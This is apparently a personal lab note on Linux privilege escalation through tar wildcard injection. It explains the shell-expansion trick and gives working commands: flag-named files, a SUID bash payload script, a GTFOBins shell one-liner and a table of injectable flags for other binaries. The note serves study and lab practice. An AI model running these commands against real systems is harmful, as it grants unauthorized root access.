# Tar Wildcard — Sudo to Root (wildcard injection)

**Trigger:** `sudo -l` shows a **fixed** command ending in a `*`, e.g.
```
(ALL) NOPASSWD: /usr/bin/tar -czvf /tmp/backup.tar.gz *
```
(First seen on PG: Cockpit/Blaze. Same idea works via cron or SUID, not just sudo.)

---

## Why it works (the one insight)

`*` is expanded by the **shell**, not by tar. Before tar ever runs, the shell replaces `*` with the list of filenames in the **current directory**. So this:
```bash
sudo tar -czvf /tmp/backup.tar.gz *
```
actually reaches tar as:
```bash
sudo tar -czvf /tmp/backup.tar.gz --checkpoint=1 "--checkpoint-action=exec=sh priv.sh" file1 file2 ...
```
tar can't tell a **filename** from a **flag** — anything starting with `-` is read as an option. So you inject flags by **creating files named like flags**. The `*` delivers them for you.

- `--checkpoint=1` → tar fires a "checkpoint" after 1 file (real, documented feature).
- `--checkpoint-action=exec=<cmd>` → run `<cmd>` at that checkpoint. This is the code exec.

Because it's run via `sudo`, that command executes **as root**.

---

## Two situations — don't confuse them

| `sudo -l` shows… | How you abuse it |
|---|---|
| tar with **free args** (`NOPASSWD: /usr/bin/tar`) | Type the GTFOBins line directly: `sudo tar cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh` |
| tar with a **fixed command + `*`** | Can't type flags (sudo pins the command) → **plant flag-named files** so `*` injects them |

GTFOBins tells you *which flag* to abuse. The **wildcard** is the delivery method when the command is pinned — GTFOBins doesn't spell that part out.

---

## Exploit (fixed command + wildcard)

Run from a directory **you can write to** — that's where `*` expands.

```bash
cd /home/<user>                                        # * expands HERE

# 1. payload: make a root-owned SUID bash
echo 'cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash' > priv.sh

# 2. plant the two flag-named files
touch ./'--checkpoint=1'
touch ./'--checkpoint-action=exec=sh priv.sh'

# 3. run the EXACT allowed sudo command
sudo /usr/bin/tar -czvf /tmp/backup.tar.gz *

# 4. cash in — -p keeps the elevated privileges
/tmp/rootbash -p
id                                                     # want: euid=0(root)
```

→ SUID bit = the copied bash runs with the **owner's** privileges. Root's tar created it, so owner = root → `bash -p` = root shell.

---

## Generalize it

A `*` in **any** privileged command (sudo / cron / SUID), run from a directory you can write to = **wildcard injection**. Look up the binary on [GTFOBins](https://gtfobins.github.io) for the flag to smuggle in:

| Binary | Flag to inject |
|---|---|
| `tar` | `--checkpoint-action=exec=` |
| `chown` / `chmod` | `--reference=<file you control>` |
| `rsync` | `-e sh` |
| `zip` | `--unzip-command` / `-T` |

---

## Related Notes

- [[Linux_Priv_Esc]] — Section 1 (Sudo Abuse)
- [[Cockpit]] — box where this landed root
